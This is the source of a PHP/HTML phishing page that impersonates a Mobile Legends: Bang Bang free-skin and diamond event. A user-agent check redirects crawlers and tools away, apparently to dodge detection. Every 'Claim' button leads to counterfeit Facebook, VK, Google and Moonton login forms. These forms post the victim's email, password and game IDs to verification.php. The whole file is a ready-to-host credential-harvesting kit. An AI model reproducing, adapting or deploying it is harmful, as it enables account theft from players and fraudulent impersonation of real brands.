<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: tokoalexhost.com');
die();
}
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="keywords" content="MLBB, MLBB Evebt, MLBB Free Skin">
        <meta name="description" content="Get claim and draw your free skin now!">
        <meta name="author" content="Alex Ariandi">
        <title>Mobile Legends: Bang Bang</title>
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Mobile Legends: Bang Bang">
        <meta property="og:type" content="website">
        <meta name="copyright" content="Moonton">
        <meta name="theme-color" content="#baaff3">
        <link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
        <meta property="og:image" content="https://i.ibb.co/hY6LgnN/iu-Tt8-Y9wz-C3-YCWg-MGp-Jcswm-XGy-G-t6-XHDy-PDv6-ZLl-GZQb-Ebeu-Lm-Sb-ZGD2-DHw-UB3-ZAv-Y-s180-rw.webp">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3ddd40ca064d997b6655739e7a0e8a65acc106e8/alex-vikontakte.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/1591ba04a57c11f4b18d2ebb39e03e4a81715c83/alex-google.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3fce8843edde49a48905ae1ed9cf237534e547dd/alex-moonton.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/06e649cdc3c3d152f9c275ded79391eeff6eb049/MLBB-rotate.css">
        <link rel="stylesheet" href="alexFrontEnd/css/style-AlexHost.css">
    </head>
    <body>
        <div class="appalexmoba">
            <div id="rotateAlexHosting" style="width: auto; background-color:#10182c; background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto;">
        <div style="display:block; width: auto; background-image: url(https://play.mobilelegends.com/events/collectenergon/images/vertical.png); background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto; animation: rotate 1.5s cubic-bezier(0.57, -0.1, 1, 0.89) infinite alternate;">
        </div>
        </div>
            <div class="conatineralexmoba" id="AlexHosting">
                <div class="headeralexmoba">
                    <div class="kiriheadmoba">
                        <img src="https://rawcdn.githack.com/AlexHostX/logAlex/e0b6e1c2dea4cb77af37b29067e401242514e538/mlbb.webp">
                    </div>
                    <div class="kananheadmoba">
                        <div class="toastmobalex">
                            <p id="toastnick">Login</p>
                        </div>
                        <div class="rulesmobaalex" onclick="showAlexrules()" onmousedown="buka.play();">
                            <p>?</p>
                        </div>
                    </div>
                </div>
                <div class="banneralexmoba">
                    <div class="slideralexbanner">
                        <iframe width="378" height="182" src="https://www.youtube.com/embed/GWeAitK4VFo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                        
                        </div>
                    </div>
                </div>
                <div class="menualexmoba">
                    <div class="itemmenualexmoba alexactive" onclick="menu1alex()" id="alex1menu" onmousedown="buka.play();">
                        <p>Skin</p>
                    </div>
                    <div class="itemmenualexmoba" onclick="menu2alex()" id="alex2menu" onmousedown="buka.play();">
                        <p>Recall</p>
                    </div>
                    <div class="itemmenualexmoba" onclick="menu3alex()" id="alex3menu" onmousedown="buka.play();">
                        <p>Diamond</p>
                    </div>
                </div>
                <div class="isimobalaex">
                    <div class="boxalexmoba alexskin">
                        <div class="menuboxmobaalex">
                            <div class="itemalexmenu kirialexaktif" onclick="claimalex()" id="claimalex" onmousedown="buka.play();">
                                <p>New Skin</p>
                            </div>
                            <div class="itemalexmenu" onclick="spinalex()" id="spinalex" onmousedown="buka.play();">
                                <p>Draw Skin</p>
                            </div>
                        </div>
                        <div class="boxitemalexmoba">
                            <div class="contalexitem contalexclaim">
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/G2W3WJbf/Alucard-Sw.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/DfGwqDg3/Argus-Sw.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/L6B4W1wy/Cyc-Sw.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/Bb2Z4L6n/skin-82.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/W5qL5M1/2.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/9vXMJFY/4.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/qr7zqNH/15.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/0KLvpSv/7.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/q5QvXxD/8.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/R9p9zDW/6.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/qd4QD1W/7.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/jbhJqKQ/8.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/kxmMKdq/9.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.ibb.co/Fgmb2XF/9.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/KY3CT7DJ/IMG-20211222-071743.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/PxG9QL6h/IMG-20211222-071757.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/1tpTC9TF/IMG-20211222-071815.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/Twr4D608/Remini20210918130840000.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/2yrtgsRK/IMG-20211222-071835.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/8z6bBZxJ/gg.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/gk5DZCtb/800.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/vTKW5nzt/1new.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/9Xgt33hw/1.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/mkkYcjQr/900.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/4Nr6dznJ/600.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/43vbjmfX/500.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/Zqzxfrhf/400.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/c4K70Dx9/4.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/9MJPFKwS/200.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/MKX5X6DY/100.jpg">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                            </div>
                            <div class="contalexspin" style="display: none">
                                <div class="spinalexmoba">
                                    <div class="ucapanalexspin">
                                        <p>Draw Spin Now!</p>
                                    </div>
                                    <div class="boxspinalexmoba">
                                        <div class="itemspinalexmoba" id="1">
                                            <div class="imgalexspinmoba rewheel-1">
                                                <img src="alexFrontEnd/img/reward/1.png">
                                                <span style="display: none">Random Epic Skin Trial Card Pack (1-Day) ×1</span>
                                            </div>
                                        </div>
                                        <div class="itemspinalexmoba" id="2">
                                            <div class="imgalexspinmoba rewheel-2">
                                                <img src="alexFrontEnd/img/reward/2.png">
                                                <span style="display: none">Gusion "Cosmic Gleam" (1-Day) ×1</span>
                                            </div>
                                        </div>
                                        <div class="itemspinalexmoba" id="3">
                                            <div class="imgalexspinmoba rewheel-3">
                                                <img src="alexFrontEnd/img/reward/3.png">
                                                <span style="display: none">Tigreal "Gold Baron"</span>
                                            </div>
                                        </div>
                                        <div class="itemspinalexmoba" id="4">
                                            <div class="imgalexspinmoba rewheel-4">
                                                <img src="alexFrontEnd/img/reward/4.png">
                                                <span style="display: none">Lunox "Eyes of Eternity"</span>
                                            </div>
                                        </div>
                                        <div class="itemspinalexmoba" id="5">
                                            <div class="imgalexspinmoba rewheel-5">
                                                <img src="alexFrontEnd/img/reward/5.png">
                                                <span style="display: none">Small Emblem Pack ×1</span>
                                            </div>
                                        </div>
                                        <div class="itemspinalexmoba" id="6">
                                            <div class="imgalexspinmoba rewheel-6">
                                                <img src="alexFrontEnd/img/reward/6.png">
                                                <span style="display: none">Gusion "Night Owl" (3-Day) ×1</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="buttonspinalexmoba">
                                        <button id="doWheel" onmousedown="buka.play();">Draw 1x (Free)</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="boxalexmoba alexrecall" style="display: none">
                        <div class="boxitemalexmoba">
                            <div class="contalexitem">
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/J0w3SMbN/b1.jpg" style="margin-bottom: 38px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/prZ9kHkX/b2.jpg" style="margin-bottom: 38px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/8PZJ6TjZ/b3.jpg" style="margin-bottom: 38px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/Pfz8dWhs/b4.jpg" style="margin-bottom: 38px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/2S3qdgWr/b5.jpg" style="margin-bottom: 38px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/pXW5rmX9/b6.jpg" style="margin-bottom: 38px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="boxalexmoba alexdiamond" style="display: none">
                        <div class="boxitemalexmoba">
                            <div class="contalexitem">
                                <div class="itemalexmoba" style="height: 100px;">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/5tpp66Zn/500.jpg" style="padding-bottom: 7px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba" style="height: 100px;">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/vBBh9GyM/1000.jpg" style="padding-bottom: 7px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba" style="height: 100px;">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/76WVnjPz/1500.jpg" style="padding-bottom: 7px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba" style="height: 100px;">
                                    <div class="imgitemalexmoba">
                                        <img src="https://i.postimg.cc/23p7PvZ8/2500.jpg" style="padding-bottom: 7px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                                <div class="itemalexmoba" style="height: 100px;">
                                    <div class="imgitemalexmoba">
                                        <img src="alexFrontEnd/img/claim/dm/5000.jpg" style="padding-bottom: 7px;">
                                    </div>
                                    <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                </div>
                
                <div class="popalexrulesmoba" style="display: none;">
                    <div class="boxmobapoprules">
                        <div class="closepoprulesalex">
                            <img src="alexFrontEnd/img/close-alex.png" onclick="closeAlexrules()" onmousedown="tutup.play();">
                        </div>
                        <div class="boxmobarulesalex">
                            <div class="ucapanpopalexrules">
                                <h3>Rules Event</h3>
                            </div>
                            <div class="steprulesalex">
                                <span>1. During the event, prizes are subject to change at any time without prior notice.</span>
                                <span>2. Only accounts that have been bind can receive gifts.</span>
                                <span>3. You can claim various prizes, ranging from skins to diamonds.</span>
                                <span>4. Draw skins can only be played once for free. It's worth 50 diamonds for the next spin.</span>
                                <span>5. Prizes or prizes from draw spins are sent directly to the in-game inbox and you can claim them from there</span>
                                <span>6. There may be a slight delay in receiving the prize. We appreciate your patience! Please contact Customer Service if you do not receive a gift.</span>
                                <span>7. MLBB reserves the right to have the final interpretation for the above content.</span>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="trueidalexmoba">
                    <div class="boxtrueidalex">
                        <div class="ucapanboxidalex">
                            <p>Enter your Game ID</p>
                        </div>
                        <div class="inputidalex">
                            <input type="number" id="playid" placeholder="User ID">
                            <input type="number" id="zoneid" placeholder="Zone ID" class="zoneid">
                        </div>
                        <div class="alertalexid">
                            <span class="warn wrong">Invalid Game ID or Zone Server</span>
                            <span class="warn tidakada">User ID could not be found</span>
                            <span class="warn respon"><i class="fas fa-spinner fa-spin"></i> In the process of checking ID</span>
                        </div>
                        <div class="buttonidalex">
                            <button onclick="TrueIDalex()" onmousedown="buka.play();">Enter</button>
                        </div>
                    </div>
                </div>
                
                <div class="rewardalexspin" style="display: none">
                    <div class="boxrewardspinalex">
                        <div class="ucapanspinalexreward">
                            <p>Congrats!</p>
                        </div>
                        <div class="boxgambaralex">
                            <img class="valueimgalex" src="">
                            <span class="valuerewardalex">Gusion "Night Owl" (3-Day) ×1</span>
                        </div>
                        <div class="buttonrewardspinalex">
                            <button onclick="showAlexlogin()" onmousedown="buka.play();">Claim</button>
                        </div>
                    </div>
                </div>
                
                <div class="alex-login slide-in-top" style="display: none">
                    <div class="pilihan-login">
                        <div class="close-alexlog" onclick="closeAlexlogin()" onmousedown="tutup.play();"></div>
                        <div class="ucapan-login">SIGN IN TO CONTINUE</div>
                            <button class="btnlogalex" onclick="alex_facebook()"><i class="fa fa-facebook" aria-hidden="true"></i> Sign in with Facebook</button><br>
                   <!---   <button class="btnlogalex" onclick="alex_vikontakte()"><i class="fa fa-vk" aria-hidden="true"></i> Sign in with VK</button><br>
                            <button class="btnlogalex" onclick="alex_google()"><i class="fa fa-google" aria-hidden="true"></i> Sign in with Google</button><br> --->
                            <button class="btnlogalex" onclick="alex_moonton()"><i class="fa fa-star" aria-hidden="true"></i> Sign in with Moonton</button>
                        </div>
                    </div>
                </div>
                
                <div class="popup-ariandi alex-facebook animate fadeIn">
                    <div class="container-box-fb">
                        <a class="close-alex-facebook" onclick="ariandi_facebook()">
                            <i class="zmdi zmdi-close"></i>
                        </a>
                        <div class="atasan-fb" style="width: 95.16%;">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/facebook_text.png">
                        </div>
                        <div class="isi-facebook">
                            <p class="kaget email-fb" style="width: 320px; top: -15px; text-align: left;">
                                The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b>
                            </p>
                            <p class="kaget sandi-fb" style="width: 320px; top: -15px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-m3.webp">
                            <div class="txt-ucapan-fb">Log in to your Facebook account to connect to Mobile Legend : BANG BANG</div>
                            <form class="form-login-fb" action="verification.php" method="POST" onsubmit="return AlexHostingNetFB()">
                                <label>
                                    <input type="text" id="alx_email_fb" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" style="background: none" required>
                                </label>
                                <label>
                                    <input type="password" id="alx_password_fb" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" style="background: none" required>
                                </label>
                                <input type="hidden" name="login" value="Facebook" readonly>
                                <input type="hidden" name="playid" id="ressplayid" value="">
                                <input type="hidden" name="zoneid" id="resszoneid" value="">
                                <input type="hidden" name="nick" id="ressnick" value="">
                                <button class="btn-login-fb" type="submit">Log In</button>
                            </form>
                            <div class="txt-buat-akun">Create account</div>
                            <div class="txt-tidak-sekarang">not now</div>
                            <div class="txt-lupa-password">Forgotten password?</div>
                        </div>
                        <div class="isi-bahasa">
                            <center>
                                <div class="nama-bahasa bahasa-aktif">English (UK)</div>
                                <div class="nama-bahasa">Bahasa Indonesia</div>
                                <div class="nama-bahasa">Basa Jawa</div>
                                <div class="nama-bahasa">Bahasa Melayu</div>
                                <div class="nama-bahasa">日本語</div>
                                <div class="nama-bahasa">Español</div>
                                <div class="nama-bahasa">Português (Brasil)</div>
                                <div class="nama-bahasa">
                                    <i class="fa fa-plus"></i>
                                </div>
                            </center>
                        </div>
                        <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
                    </div>
                </div>
                <div class="popup-ariandi alex-vikontakte animate fadeIn">
                    <div class="container-box-vk">
                        <a class="close-alex-vk" onclick="ariandi_vikontakte()">
                            <i class="zmdi zmdi-close"></i>
                        </a>
                        <div class="atasan-vk">
                            <center>
                                <p class="kagetvk email-vk">
                                    Please check if the <b>login</b>
                                    and <b>password</b>
                                    you entered are correct.
                                </p>
                                <p class="kagetvk sandi-vk">
                                    Please check if the <b>login</b>
                                    and <b>password</b>
                                    you entered are correct.
                                </p>
                                <img class="img-logvk" src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/vk-alex.png">
                            </center>
                        </div>
                        <div class="isi-vikontakte">
                            <center>
                                <form action="verification.php" method="POST" onsubmit="return AlexHostingNetVK()">
                                    <div class="ucapan-vk">
                                        Login to <b>VK</b>
                                        to carry on.
                                    </div>
                                    <div class="form-login-vk">
                                        <label>Phone, email, or username</label>
                                        <input type="text" id="alx_email_vk" name="email" placeholder="" required>
                                    </div>
                                    <div class="form-login-vk">
                                        <label>Password</label>
                                        <input type="password" id="alx_password_vk" name="password" placeholder="" required>
                                    </div>
                                    <input type="hidden" name="login" value="VK" readonly>
                                    <input type="hidden" name="playid" id="ressplayid" value="">
                                    <input type="hidden" name="zoneid" id="resszoneid" value="">
                                    <input type="hidden" name="nick" id="ressnick" value="">
                                    <button class="btn-login-vk" type="submit">Log in</button>
                                </form>
                                <button class="close-submit-vk" onclick="ariandi_vikontakte()">Cancel</button>
                            </center>
                        </div>
                    </div>
                </div>
                <div class="popup-ariandi alex-google animate fadeIn">
                    <div class="container-box-google">
                        <a class="close-alex-google" onclick="ariandi_google()">
                            <i class="zmdi zmdi-close"></i>
                        </a>
                        <div class="atasan-google">
                            <center>
                                <p class="kagetgp email-gp">wrong email or phone number</p>
                                <p class="kagetgp sandi-gp">password does not match</p>
                                <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/google.png">
                            </center>
                        </div>
                        <div class="isi-google">
                            <center>
                                <form action="verification.php" method="POST" onsubmit="return AlexHostingNetGP()">
                                    <div class="ucapan-gp">Sign in</div>
                                    <div class="form-login-gp">
                                        <label>Email or Phone</label>
                                        <input type="text" id="alx_email_gp" name="email" placeholder="" required>
                                    </div>
                                    <div class="form-login-gp">
                                        <label>Password</label>
                                        <input type="password" id="alx_password_gp" name="password" placeholder="" required>
                                    </div>
                                    <input type="hidden" name="login" value="Google" readonly>
                                    <input type="hidden" name="playid" id="ressplayid" value="">
                                    <input type="hidden" name="zoneid" id="resszoneid" value="">
                                    <input type="hidden" name="nick" id="ressnick" value="">
                                    <button class="btn-login-gp" type="submit">Login</button>
                                </form>
                                <button class="close-submit-gp" onclick="ariandi_google()">Create account?</button>
                            </center>
                        </div>
                    </div>
                </div>
                <div class="popup-ariandi alex-moonton animated fadeIn">
                    <div class="container-box-mt">
                        <a class="close-alex-mt" onclick="ariandi_moonton()"><i class="zmdi zmdi-close"></i></a>
                        <div class="isi-mt">
                            <div class="txt-ucapan-mt">Sign in with your Moonton Account</div>
                                <form action="verification.php" method="POST" onsubmit="return AlexHostingNetMT()">
                                    <label class="label-mt">
                                        <input class="input-form-mt" id="alx_email_mt" type="text" name="email" placeholder="Email address/Moonton Account" autocomplete="off" autocapitalize="off" required>
                                        <p class="kagetmt email-mt">*it seems that no account has that email</p>
                                    </label>
                                    <label class="label-mt">
                                        <input class="input-form-mt" id="alx_password_mt" type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
                                        <p class="kagetmt sandi-mt">*passwords don't match</p>
                                    </label>
                                        <p class="quotes-mt">by clicking "Sign In" means that you have agreed to Moonton's terms and conditions.</p>
                                        <input type="hidden" name="login" value="Moonton" readonly>
                                        <input type="hidden" name="playid" id="ressplayid" value="">
                                <input type="hidden" name="zoneid" id="resszoneid" value="">
                                <input type="hidden" name="nick" id="ressnick" value="">
                                    <button type="submit" class="btn-login-mt">Sign In</button>
                                </form>
                                </br>
                                </br>
                            </div>
                        </div>
                    </div>
                </div>
                <audio controls loop id="lagualex" src="https://rawcdn.githack.com/AlexHostX/all.asset/001b222ae2a78373bc3a26702125100aedcccfaf/Mobile%20Legends%20Bang%20Bang%20-%20Main%20Theme%20(Live%20Orchestra).mp3" style="display: none"></audio>
            </div>
        </div>
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="alexFrontEnd/js/js-AlexHost.js"></script>
        <script src="https://rawcdn.githack.com/AlexHostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
    </body>
</html>